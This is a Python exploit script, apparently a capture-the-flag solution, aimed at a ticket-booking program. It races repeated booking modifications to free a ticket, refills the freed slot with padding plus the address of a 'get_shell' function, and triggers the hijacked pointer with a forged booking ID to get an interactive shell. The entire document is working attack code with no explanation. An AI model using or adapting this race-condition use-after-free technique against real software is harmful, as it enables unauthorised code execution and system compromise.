import interact
import struct
import time

# Pack integer 'n' into a 8-Byte representation
def p64(n):
    return struct.pack('Q', n)

# Unpack 8-Byte-long string 's' into a Python integer
def u64(s):
    return struct.unpack('Q', s)[0]

p = interact.Process()

print("[*] Buying initial ticket...")
p.sendlineafter('Choice:', '1')
p.sendlineafter('name:', 'sucka')
data = p.readline()
print(data)

booking_num = data.strip().split(" ")[-1]
print(booking_num)


print("[*] Starting Race (running for 5 seconds)...")

start_time = time.time()
while time.time() - start_time < 5:
    p.sendline('3')
    p.sendline(booking_num)
    p.sendline('15')
    
    p.sendline('3')
    p.sendline(booking_num)
    p.sendline('0')
    
    p.readuntil('Choice:')

print("[*] Race finished. Ticket should be freed now.")

get_shell = 0x401654
payload = b'A' * 16 + p64(get_shell)

print("[*] Sending Payload (Allocating new name into freed ticket slot)...")
p.sendline('1')
p.sendlineafter('name:', payload)

print(p.readline()) 


# 0x41414141 = 1094795585
corrupted_id = "1094795585"

print("[*] Triggering shell via corrupted ID")
p.sendlineafter('Choice:', '2')
p.sendlineafter('number:', corrupted_id)

p.interactive()
